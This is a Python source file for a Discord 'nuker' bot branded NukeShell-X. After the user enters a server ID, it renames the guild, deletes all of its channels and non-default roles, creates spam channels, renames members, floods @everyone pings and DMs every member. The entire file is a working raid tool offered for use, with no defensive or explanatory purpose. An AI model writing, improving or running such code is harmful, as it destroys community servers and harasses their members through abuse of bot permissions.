import logging
logging.basicConfig(level=logging.CRITICAL)
logging.getLogger("discord").setLevel(logging.CRITICAL)
logging.getLogger("discord.client").setLevel(logging.CRITICAL)
logging.getLogger("discord.gateway").setLevel(logging.CRITICAL)
logging.getLogger("asyncio").setLevel(logging.CRITICAL)

import os
import json
import asyncio
import time
import getpass
import discord 

MID_RED = "\033[38;2;180;25;25m"
RESET = "\033[0m"

def gradient_text(text):
    result = ""
    length = len(text)

    def gradient_block(text):
        return "\n".join(gradient_text(line) for line in text.splitlines())


    start_rgb = (50, 0, 0)
    mid_rgb   = (180, 25, 25)
    end_rgb   = (35, 0, 0)

    for i, char in enumerate(text):
        if char == " ":
            result += char
            continue

        ratio = i / max(1, length - 1)

        if ratio < 0.5:
            r = int(start_rgb[0] + (mid_rgb[0] - start_rgb[0]) * (ratio * 2))
            g = int(start_rgb[1] + (mid_rgb[1] - start_rgb[1]) * (ratio * 2))
            b = int(start_rgb[2] + (mid_rgb[2] - start_rgb[2]) * (ratio * 2))
        else:
            r = int(mid_rgb[0] + (end_rgb[0] - mid_rgb[0]) * ((ratio - 0.5) * 2))
            g = int(mid_rgb[1] + (end_rgb[1] - mid_rgb[1]) * ((ratio - 0.5) * 2))
            b = int(mid_rgb[2] + (end_rgb[2] - mid_rgb[2]) * ((ratio - 0.5) * 2))

        result += f"\033[38;2;{r};{g};{b}m{char}"

    return result + RESET

os.system("cls" if os.name == "nt" else "clear")

BANNER = r"""
 ███▄    █  █    ██  ██ ▄█▀▓█████  ██████  ██░ ██ ▓█████  ██▓     ██▓    ▒███   ███▒
 ██ ▀█   █  ██  ▓██▒ ██▄█▒ ▓█   ▀ ██    ▒ ▓██░ ██▒▓█   ▀ ▓██▒    ▓██▒     ▒▒██ ██ ▒░
▓██  ▀█ ██▒▓██  ▒██░▓███▄░ ▒███    ▓██▄   ▒██▀▀██░▒███   ▒██░    ▒██░     ░░  █   
▓██▒  ▐▌██▒▓▓█  ░██░▓██ █▄ ▒▓█  ▄  ▒   ██▒░▓█ ░██ ▒▓█  ▄ ▒██░    ▒██░     ░░██ ██ ▒
▒██░   ▓██░▒▒█████▓ ▒██▒ █▄░▒████▒██████▒▒░▓█▒░██▓░▒████▒░██████▒░██████▒▒███▒ ▒███▒
░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ ▒ ▒▒ ▓▒░░ ▒░ ░ ▒▓▒ ▒ ░ ▒ ░░▒░▒░░ ▓░ ░░ ▒░▓  ░░ ▒░▓  ░▒▒ ░ ░▓ ░ ░
░ ░░   ░ ▒░░░▒░ ░ ░ ░ ░▒ ▒░ ░ ░  ░ ░▓  ░ ░ ▒ ░▒░ ░ ░ ▓  ░░ ░ ▒  ░░ ░ ▒  ░░░ ░ ░▒ ░
   ░   ░ ░  ░░░ ░ ░ ░ ░░ ░    ░  ░  ░  ░   ░  ░░ ░ ░ ░  ░  ░ ░  ░  ░ ░  ░ ░   ░░  
         ░    ░     ░  ░      ░  ░  ░  ░   ░  ░  ░   ░  ░    ░  ░    ░    ░    ░  
         ░                             ░             ░                                             
                                                                       - By lortis  
"""

for line in BANNER.splitlines():
    print(gradient_text(line))
    time.sleep(0.03)

print()
print(gradient_text("Press enter to continue"))
input()
print()

with open("config.json", "r", encoding="utf-8") as f:
    config = json.load(f)

TOKEN = config["bot_token"]

intents = discord.Intents.all()
bot = discord.Client(intents=intents)

async def nuke_guild(guild):
    delays = config["delays"]
    texts = config["text_messages"]
    settings = config["settings"]

    try:
        await guild.edit(name="NukeShell-X")
        await asyncio.sleep(1)
    except Exception:
        pass

    for channel in list(guild.channels):
        try:
            await channel.delete()
            await asyncio.sleep(delays["delete_channel"])
        except Exception:
            continue

    for role in list(guild.roles):
        if role.name != "@everyone":
            try:
                await role.delete()
                await asyncio.sleep(delays["delete_role"])
            except Exception:
                continue

    await asyncio.sleep(delays["after_all_actions"])

    salons = []
    for _ in range(settings["num_channels_to_create"]):
        try:
            salon = await guild.create_text_channel(texts["channel_name"])
            salons.append(salon)
            await asyncio.sleep(delays["create_channel"])
        except Exception:
            continue

    if settings.get("rename_members"):
        for member in guild.members:
            try:
                if member == bot.user:
                    continue
                await member.edit(nick=texts.get("member_nickname", "NouveauNom"))
                await asyncio.sleep(delays.get("rename_member", 1))
            except Exception:
                continue
            
    for _ in range(settings["num_messages_per_channel"]):
        try:
            await asyncio.gather(
                *[salon.send(texts["everyone_ping_message"]) for salon in salons],
                return_exceptions=True
            )
            await asyncio.sleep(delays["send_messages"])
        except Exception:
            continue

    for member in guild.members:
        if not member.bot:
            try:
                await member.send(texts["dm_message"])
                await asyncio.sleep(delays["dm_members"])
            except Exception:
                continue


async def cmd_listener():
    user = getpass.getuser()

    prompt_text = f"""┌──({user}@NukerBot) - [Sent id serveur]
└──$"""

    prompt = "\n".join(gradient_text(line) for line in prompt_text.splitlines()) + " "

    while True:
        cmd = await asyncio.get_event_loop().run_in_executor(None, input, prompt)

        server_id = cmd.strip()

        if not server_id.isdigit():
            print(gradient_text("[!] Please enter a valid server ID"))
            continue

        try:
            guild = bot.get_guild(int(server_id))
            if guild:
                print(gradient_text("[+] Nuking in progress.."))
                await nuke_guild(guild)

                print(gradient_text("[+] Nuking finished !"))

            else:
                print(gradient_text("[!] Server not found"))
        except Exception as e:
            print(gradient_text(f"[!] Error: {e}"))


@bot.event
async def on_ready():
    bot.loop.create_task(cmd_listener())

try:
    bot.run(TOKEN, log_handler=None)
except Exception as e:
    print(gradient_text("ERREUR : The bot could not start"))
    print(e)